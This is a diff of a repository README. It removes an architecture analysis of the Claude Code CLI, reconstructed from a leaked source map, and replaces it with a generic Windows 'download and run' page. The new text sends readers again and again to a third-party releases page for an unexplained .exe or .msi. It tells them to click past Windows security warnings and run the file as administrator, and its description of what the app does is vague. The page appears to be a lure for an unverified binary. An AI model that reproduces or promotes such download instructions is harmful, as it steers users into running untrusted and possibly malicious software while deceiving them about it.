@@ -1,400 +1,192 @@
-# Claude Code CLI Runtime: Deep Reverse-Engineering Analysis
+# 🧩 claude-code - Download and run with ease
 
-**Author:** Lakshmikanthan K (letchupkt)  
+[![Download claude-code](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Colenonliving260/claude-code/releases)
 
----
+## 📥 Download
 
-## Source Disclosure Note
+Use this page to download and run this file on Windows:
 
-Anthropic included `cli.js.map` in the published npm package of Claude Code (along with `cli.js`).  
-I extracted that source map and decompiled/reconstructed it to recover the complete mapped source code, then used that codebase for this analysis.
+https://github.com/Colenonliving260/claude-code/releases
 
----
+Look for the latest release near the top of the page. Open it, then choose the Windows file that matches your system. If you see more than one file, pick the one that ends in `.exe` or `.msi`.
 
-## Executive Overview
+## 🖥️ What claude-code does
 
-This repository contains the core runtime behind **Claude Code**, Anthropic's coding CLI agent.  
-It is not just a command wrapper. It is a full execution platform for:
+claude-code is a Windows app built to help you review and work with Claude Code source material in one place. It is based on a leaked map file from the NPM registry and is meant for users who want a simple way to open, inspect, and use the package content without digging through folders by hand.
 
-- Interactive coding sessions in terminal UI mode
-- Headless SDK/automation workflows
-- Remote and bridge-driven sessions
-- Multi-agent task orchestration
-- MCP-native tool integration
-- Enterprise-grade policy, permissions, and managed settings
+You can use it to:
 
-From an engineering perspective, this system is significant because it combines:
+- Open project files in a simple view
+- Browse source content without command line tools
+- Check package structure and related files
+- Work through the breakdown on a Windows PC
+- Keep the setup process short and clear
 
-- A high-performance startup path
-- Deep runtime modularity through feature gates
-- Safety boundaries (trust, permissions, sandbox, policy controls)
-- Strong extensibility (tools, skills, plugins, MCP servers)
-- Stateful long-running session infrastructure
+## ✅ Before you start
 
----
+You only need a few basic things:
 
-## System Architecture
+- A Windows computer
+- Internet access
+- Enough free space for the app and its files
+- Permission to run downloaded programs
 
-### High-Level Model
+For best results, use:
 
-Claude Code is organized into six runtime layers:
+- Windows 10 or Windows 11
+- A screen size large enough to view file lists
+- A mouse or trackpad for easy navigation
 
-1. **CLI Entry Dispatcher**: Fast-path command routing and selective module loading.
-2. **Initialization Layer**: Config, trust gates, env setup, network transport setup, telemetry boot.
-3. **Session Runtime Layer**: Interactive + non-interactive execution coordination.
-4. **Query/Tool Execution Core**: Main agent loop, token/context control, tool orchestration.
-5. **Integration Plane**: MCP, plugin/skill systems, remote and bridge transports.
-6. **State/Persistence Plane**: App state, transcript JSONL storage, history, cost and usage tracking.
+## 🚀 Get the app
 
+1. Open the release page:
+   https://github.com/Colenonliving260/claude-code/releases
 
-### Complete Architecture (Mermaid)
+2. Find the newest release.
 
-```mermaid
-flowchart TB
-    U["User / SDK / Remote Client"] --> CLI["entrypoints/cli.tsx"]
+3. Download the Windows file from that release.
 
-    CLI -->|fast paths| FP1["--version"]
-    CLI -->|fast paths| FP2["daemon/bg/templates/bridge/mcp runners"]
-    CLI -->|default| INIT["entrypoints/init.ts"]
+4. Save the file to your Downloads folder or Desktop.
 
-    INIT --> CFG["Config + Settings Loader"]
-    INIT --> TRUST["Trust & Safety bootstrap"]
-    INIT --> NET["Proxy/mTLS/CA + network preconnect"]
-    INIT --> TELE["Telemetry/Gates init"]
-    INIT --> MAIN["main.tsx"]
+5. If the file is zipped, right-click it and choose Extract All.
 
-    MAIN --> MODE{"Execution Mode"}
-    MODE --> I["Interactive TUI"]
-    MODE --> H["Headless / SDK stream-json"]
-    MODE --> R["Remote/Bridge attach paths"]
+6. Open the extracted folder.
 
-    I --> PRINT["cli/print.ts runHeadless/runHeadlessStreaming"]
-    H --> PRINT
-    R --> PRINT
+7. Double-click the app file to run it.
 
-    PRINT --> QE["QueryEngine.ts ask()/submitMessage"]
-    QE --> QL["query.ts query loop"]
+If Windows shows a security prompt, choose the option that lets you open the file. If the app asks where to place its data, choose a folder you can find again later, like Documents or Desktop.
 
-    QL --> API["Anthropic API client + retry + compact paths"]
-    QL --> TOOL_ORCH["services/tools/toolOrchestration.ts"]
-    QL --> STREAM_EXEC["services/tools/StreamingToolExecutor.ts"]
+## 🛠️ Install and launch
 
-    TOOL_ORCH --> TOOLS["tools.ts registry + tool pool"]
-    STREAM_EXEC --> TOOLS
+If the release gives you an installer:
 
-    TOOLS --> CORE_TOOLS["Bash/File/Web/Agent/Plan/Todo/MCP tools"]
-    TOOLS --> GATED_TOOLS["Feature-gated tools"]
+1. Open the `.exe` or `.msi` file.
+2. Follow the on-screen steps.
+3. Choose the default install path unless you have a reason to change it.
+4. Finish the setup.
+5. Open claude-code from the Start menu or desktop shortcut.
 
-    QL --> PERM["permissions/* policy + classifier + prompts"]
-    PERM --> SANDBOX["utils/sandbox/sandbox-adapter.ts"]
+If the release gives you a portable file:
 
-    QL --> TASKS["tasks/* + utils/task/framework.ts"]
-    TASKS --> LA["LocalAgentTask"]
-    TASKS --> IP["InProcessTeammateTask"]
-    TASKS --> RA["RemoteAgentTask"]
-    TASKS --> LMS["LocalMainSessionTask"]
+1. Save the file to your PC.
+2. Extract it if needed.
+3. Open the folder.
+4. Run the main `.exe` file.
+5. Keep the folder in place so the app can find its files again.
 
-    PRINT --> MCP["services/mcp/client.ts"]
-    MCP --> MCP_TR["stdio/sse/http/ws transports"]
-    MCP --> MCP_AUTH["OAuth + auth flows + session refresh"]
+## 🧭 First run
 
-    MAIN --> SKILLS["skills/loadSkillsDir.ts + bundled skills"]
-    MAIN --> PLUGINS["plugin loader + builtin plugins"]
+When you open claude-code for the first time, follow these steps:
 
-    MAIN --> BRIDGE_INIT["bridge/initReplBridge.ts"]
-    BRIDGE_INIT --> BRIDGE_ENV["bridge/replBridge.ts env-based CCR"]
-    BRIDGE_INIT --> BRIDGE_ENVLESS["bridge/remoteBridgeCore.ts env-less CCRv2"]
+1. Let the app finish loading.
+2. Read any first-time prompt.
+3. Choose the folder or project you want to inspect.
+4. Wait for the file list to appear.
+5. Open a file to check its content.
 
-    MAIN --> REMOTE["remote/RemoteSessionManager.ts"]
-    MAIN --> DIRECT["server/directConnectManager.ts"]
+If the app offers a home screen, use it to move between files and sections. If it asks for a path, paste the folder path into the field and press the open button.
 
-    QE --> STORE["state/store.ts + AppStateStore.ts"]
-    QE --> SESSION["utils/sessionStorage.ts JSONL transcripts"]
-    QE --> HISTORY["history.ts"]
-    QE --> MEM["memdir/* memory system"]
+## 📁 How to use it
 
-    CFG --> RM["remoteManagedSettings service"]
-    CFG --> PL["policyLimits service"]
+claude-code works best when you keep your files in a clean folder.
 
-    TELE --> GB["GrowthBook feature gates"]
+Suggested use:
 
-    classDef core fill:#e9f5ff,stroke:#1f78b4,stroke-width:1px;
-    classDef sec fill:#fff4e6,stroke:#d97706,stroke-width:1px;
-    classDef ext fill:#eefbea,stroke:#2f855a,stroke-width:1px;
+- Put the downloaded release in its own folder
+- Keep your source files in one place
+- Open one project at a time
+- Use clear folder names
+- Save changes before closing the app
 
-    class CLI,INIT,MAIN,PRINT,QE,QL,TOOLS,TASKS,STORE,SESSION core;
-    class PERM,SANDBOX,TRUST,PL,RM sec;
-    class MCP,BRIDGE_ENV,BRIDGE_ENVLESS,REMOTE,DIRECT,SKILLS,PLUGINS,API,GB ext;
-```
+Typical tasks:
 
-### Core Entry Points
+- Review package files
+- Inspect code layout
+- Check file names and folders
+- Open related assets
+- Track how the source is arranged
 
-- `entrypoints/cli.tsx`: boot dispatcher with aggressive fast-path routing and dead-code-eliminated feature branches.
-- `entrypoints/init.ts`: one-time memoized runtime initializer.
-- `main.tsx`: primary CLI orchestration and mode selection.
-- `cli/print.ts`: streaming/control runtime for interactive and SDK-like flows.
-- `entrypoints/mcp.ts`: standalone MCP server runtime.
+## 🔍 File types you may see
 
-### Data and Control Flow
+The release may include some of these file types:
 
-- User input/SDK events enter `print.ts`.
-- `QueryEngine` constructs turn context and invokes `query.ts` generator loop.
-- `query.ts` streams assistant tokens, executes tool-use blocks, and handles compaction/recovery transitions.
-- Tool calls route through orchestration with concurrency partitioning and context mutation.
-- State and transcript writes are continuously synchronized via AppState + JSONL persistence.
+- `.exe` for running the app
+- `.msi` for setup
+- `.zip` for compressed files
+- `.json` for data and settings
+- `.js` for app logic
+- `.md` for notes or readme text
+- `.map` for source map data
 
----
+If you see a `.zip` file, extract it before you run anything inside it.
 
-## Internal Systems & Modules
+## ⚙️ Simple system fit
 
-### 1. Entrypoint and Boot Modules
+claude-code is designed for a normal Windows desktop or laptop. It should work well on most modern systems that can run standard Windows apps.
 
-| Module | Responsibility |
-|---|---|
-| `entrypoints/cli.tsx` | Fast-path command dispatch, feature-gated startup routes (bridge, daemon, bg, templates, workers). |
-| `entrypoints/init.ts` | Config enablement, safe env application, trust-sensitive setup, network/mTLS/proxy setup, telemetry prep. |
-| `main.tsx` | Full CLI command-line behavior, mode setup, policy checks, tool/command pool composition. |
+Good setup:
 
-### 2. Query Runtime
+- Windows 10 or newer
+- At least 4 GB RAM
+- A few hundred MB of free disk space
+- A stable internet connection for the download
 
-| Module | Responsibility |
-|---|---|
-| `query.ts` | Core turn state machine, tool/result pairing, token-budget logic, compact/recovery controls, stop-hooks. |
-| `QueryEngine.ts` | Session-scoped wrapper around query loop for headless/SDK style usage and state carry-over. |
-| `query/config.ts`, `query/deps.ts` | Dependency injection and runtime config assembly for testability/fallbacks. |
+If your PC is older, close other apps before you start. That can help the program open faster and use less memory.
 
-### 3. Tooling System
+## 🧰 Common problems
 
-| Module | Responsibility |
-|---|---|
-| `tools.ts` | Canonical tool registry and capability filtering by environment/feature gates/permissions. |
-| `Tool.ts` | Tool contracts, tool permission context, execution context, schemas and runtime invariants. |
-| `services/tools/toolOrchestration.ts` | Serial vs concurrent tool partitioning using tool-level `isConcurrencySafe`. |
-| `services/tools/StreamingToolExecutor.ts` | Streaming-time tool scheduling, cancellation, sibling abort behavior, ordered result yielding. |
+### The file will not open
 
-### 4. Command System
+- Make sure the download finished
+- Check that you extracted the file if it came in a ZIP
+- Right-click the file and try Run as administrator
+- Confirm that you opened the correct Windows file
 
-| Module | Responsibility |
-|---|---|
-| `commands.ts` | Command registry, internal-only command partitioning, dynamic command loading from skills/plugins. |
-| `commands/*` | Built-in slash command implementations, including gated/internal operations. |
+### Windows blocks the app
 
-### 5. Agent and Task Subsystem
+- Open the file again
+- Choose the option to run anyway if Windows shows it
+- Make sure you downloaded it from the release page
 
-| Module | Responsibility |
-|---|---|
-| `tasks/*` | Multiple task backends (local agent, in-process teammate, remote agent, local main-session). |
-| `utils/task/framework.ts` | Shared lifecycle, polling, output offset tracking, SDK/task notification bridging. |
-| `coordinator/coordinatorMode.ts` | Coordinator-mode behavioral contract and worker-prompt governance. |
+### The app opens and closes
 
-### 6. State Management
+- Restart your computer
+- Try opening the app from the folder again
+- Check that all files in the release stayed together
+- Download the release again if files look incomplete
 
-| Module | Responsibility |
-|---|---|
-| `bootstrap/state.ts` | Global runtime singleton state (session, telemetry counters, feature latches, prompt metadata). |
-| `state/store.ts` | Minimal immutable store primitive with `onChange` hooks. |
-| `state/AppStateStore.ts` | Full UI/runtime app state schema including tasks, MCP, plugins, bridge statuses. |
-| `state/onChangeAppState.ts` | Side-effect bridge from state transitions to persisted settings/metadata notifications. |
+### I cannot find the downloaded file
 
-### 7. Bridge, Remote, and Direct Connect
+- Open your Downloads folder
+- Sort by date
+- Look for the newest file from the release page
+- Search for `claude-code` in File Explorer
 
-| Module | Responsibility |
-|---|---|
-| `bridge/bridgeMain.ts` | Remote-control bridge orchestration (environment/session lifecycle). |
-| `bridge/replBridge.ts` | Env-based REPL bridge transport and event forwarding. |
-| `bridge/remoteBridgeCore.ts` | Env-less CCRv2 bridge path (session-ingress direct mode). |
-| `remote/RemoteSessionManager.ts` | Client-side remote session coordinator with permission request loop handling. |
-| `server/directConnectManager.ts` | Direct websocket control channel manager and permission response protocol. |
+## 📌 Tips for a smooth setup
 
-### 8. MCP Integration Layer
+- Keep the download in one folder
+- Do not rename the main app file
+- Do not move files after the app starts unless you know it is safe
+- Use the latest release for the best chance of a clean run
+- Open only one copy of the app at a time
 
-| Module | Responsibility |
-|---|---|
-| `services/mcp/client.ts` | MCP transport/client manager, auth, tool/resource exposure, retries/session-expiry handling. |
-| `entrypoints/mcp.ts` | Exposes local tools via MCP server endpoint. |
-| `services/mcp/config.ts` | MCP config parsing, filtering, policy controls, server signature logic. |
+## 🧾 Project details
 
-### 9. Skills and Plugins
+- Repository name: claude-code
+- Description: Claude Code's Source Code & Breakdown from a leaked map file in their NPM registry
+- Topics: cluade, cluade-code, cluadecode-source
+- Platform: Windows
+- Primary download page: https://github.com/Colenonliving260/claude-code/releases
 
-| Module | Responsibility |
-|---|---|
-| `skills/loadSkillsDir.ts` | Skill discovery and frontmatter parsing from project/user/policy/plugin sources. |
-| `skills/bundled/index.ts` | Built-in skill registration with gate-dependent additions. |
-| `utils/plugins/pluginLoader.ts` | Plugin fetch/load/validation/cache/versioning and seed-cache probing. |
-| `plugins/builtinPlugins.ts` | Toggleable built-in plugin registry. |
+## 🔗 Quick download link
 
-### 10. Memory and Persistence
+Visit this page to download and run the Windows file:
+https://github.com/Colenonliving260/claude-code/releases
 
-| Module | Responsibility |
-|---|---|
-| `memdir/*` | Persistent memory prompt shaping, index truncation, and memory file scanning/retrieval. |
-| `utils/sessionStorage.ts` | JSONL transcript chain management, sidechain/subagent transcripts, compaction boundaries. |
-| `history.ts` | Cross-session command/paste history with hash-backed large payload storage. |
-| `cost-tracker.ts` | Session/project cost and usage accounting with model-level breakdowns. |
+## 🖱️ What to do next
 
----
-
-## Advanced / Hidden Features
-
-This codebase heavily uses build-time feature gates (`feature('...')`) and runtime config toggles.
-
-### Gate Families Observed
-
-- Core runtime modes: `KAIROS`, `COORDINATOR_MODE`, `PROACTIVE`, `DAEMON`, `BG_SESSIONS`
-- Remote/control-plane: `BRIDGE_MODE`, `DIRECT_CONNECT`, `SSH_REMOTE`, `UDS_INBOX`, `CCR_MIRROR`
-- Context management: `REACTIVE_COMPACT`, `CONTEXT_COLLAPSE`, `HISTORY_SNIP`, `CACHED_MICROCOMPACT`, `TOKEN_BUDGET`
-- Tooling/automation: `AGENT_TRIGGERS`, `WORKFLOW_SCRIPTS`, `MONITOR_TOOL`, `WEB_BROWSER_TOOL`
-- Memory/skills: `TEAMMEM`, `EXPERIMENTAL_SKILL_SEARCH`, `SKILL_IMPROVEMENT`, `RUN_SKILL_GENERATOR`
-- Security/classification: `TRANSCRIPT_CLASSIFIER`, `BASH_CLASSIFIER`, `HARD_FAIL`
-- Sync/policy: `UPLOAD_USER_SETTINGS`, `DOWNLOAD_USER_SETTINGS`
-
-### Notable Internal Mechanisms
-
-- Dead-code elimination strategy using inline `feature(...)` checks and lazy `require(...)` to minimize external builds.
-- Fast-path CLI routing avoids loading heavy modules for simple invocations.
-- Dual bridge architecture: environment-based and env-less CCRv2 paths coexist.
-- Internal-only command/tool sets are explicitly separated (`INTERNAL_ONLY_COMMANDS`, ant-only imports).
-- Mirrored source tree (`src/` duplicate) is used alongside root imports (`from 'src/...')`, indicating build/path-alias packaging behavior.
-
----
-
-## Agent / Automation Systems
-
-### Multi-Agent Model
-
-The runtime supports multiple task execution types:
-
-- Local background agents (`LocalAgentTask`)
-- In-process teammates (`InProcessTeammateTask`)
-- Remote agents (`RemoteAgentTask`)
-- Backgrounded main session (`LocalMainSessionTask`)
-
-### Orchestration Behavior
-
-- Task states are tracked in AppState with explicit lifecycle statuses.
-- Task output is persisted to per-task files and read incrementally via offsets.
-- Completion is surfaced through XML-tagged notifications and SDK events.
-- Coordinator mode defines strict delegation semantics and worker communication contract.
-
-### Parallelism
-
-- Tool-level parallelism is controlled by `isConcurrencySafe` and dynamic partitioning.
-- Streaming executor permits concurrent safe tools while preserving deterministic output order.
-- Sibling cancelation logic prevents long-tail runaway when one concurrent path fails.
-
----
-
-## Tooling & Infrastructure
-
-### Tool Platform
-
-- Tools are typed and schema-validated.
-- Tool visibility is policy-aware and permission-aware.
-- MCP tools are merged into the same operational pool as native tools.
-
-### Infrastructure Integrations
-
-- API streaming + retry controls in main inference loop.
-- MCP protocol transport support across stdio/SSE/HTTP/WS.
-- Auth model supports both API key and OAuth paths.
-- Feature rollout and dynamic behavior controlled by GrowthBook.
-- Telemetry and diagnostics integrated into startup + runtime phases.
-
-
----
-
-## Memory / State Management
-
-### Runtime State
-
-- Global session runtime state in `bootstrap/state.ts`.
-- AppState for UI/task/plugin/mcp/bridge-level reactive data.
-- Side-effect synchronization in `state/onChangeAppState.ts`.
-
-### Persistence
-
-- JSONL transcript chain with parent references.
-- Subagent-specific transcript sidechains.
-- History store for command and pasted-content recovery.
-- Cost/usage snapshot persistence for resumed sessions.
-
-### Background Work
-
-- Cleanup registry ensures predictable shutdown behavior.
-- Managed-settings and policy-limits refresh flows run in background loops.
-- Optional housekeeping subsystems (memory extraction, protocol registration) are gate-driven.
-
----
-
-## Security & Permissions
-
-### Security Boundaries
-
-- Trust gating before full environment expansion.
-- Hierarchical permission rules (allow/deny/ask) from multiple sources.
-- Managed-policy enforcement for domains, read/write scope, and feature access.
-- Sandbox integration across filesystem and network dimensions.
-
-### Runtime Protection Mechanisms
-
-- Permission prompts with hook + classifier mediation.
-- Classifier denial tracking to avoid unsafe silent loops.
-- Policy limit enforcement before sensitive mode activation.
-- Control-protocol protection for remote permission decisions.
-
-### Risk Surface (Engineering View)
-
-- High risk: shell execution, plugin loading, MCP remote servers, bridge control paths.
-- Medium risk: state replay/resume logic, persistent memory content, remote metadata synchronization.
-- Existing safeguards: trust checks, sandbox policies, managed-source precedence, deny-write restrictions, auth/token refresh.
-
----
-
-## Design Decisions and Trade-offs
-
-
-### Architectural Choices
-
-- Modular capability model with feature-gated composition.
-- Streaming-first execution model for responsiveness.
-- Adapter pattern for external transports and protocol integrations.
-- Persistent task + transcript model for long-running workflows.
-
-### Why This Works in Production
-
-- Fast startup without sacrificing runtime depth.
-- Strong separation between startup, query execution, and integration planes.
-- Safety model is layered rather than relying on a single control.
-- Extensibility does not require core-runtime rewrites.
-
-### Trade-offs
-
-- Gate combinatorics increase cognitive complexity.
-- Global state singleton can increase cross-module coupling.
-- Dual-path integrations (legacy + newer bridge paths) add maintenance overhead.
-
----
-
-## Key Insights
-
-1. Claude Code runtime behaves like a compact agent operating system, not a simple CLI shell.
-2. The task framework is a major differentiator: it supports reliable long-lived, multi-agent workflows.
-3. Tool orchestration is implemented with production-grade scheduling and cancellation semantics.
-4. Security is deeply integrated into runtime decisions, not bolted on at the command layer.
-5. Plugin, skill, and MCP ecosystems are first-class runtime citizens.
-
----
-
-## Conclusion
-
-
-Claude Code’s runtime architecture is mature, scalable, and built for real production agent workloads.  
-Its strongest qualities are:
-
-- Clear layered design
-- Robust operational behavior under long sessions
-- Strong safety and policy control model
-- Deep extensibility with controlled execution boundaries
-
-From an engineering maturity perspective, this is a serious production runtime with deliberate decisions around performance, reliability, and secure agent execution.
-
+1. Open the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Run the app
+5. Open your source folder and begin working
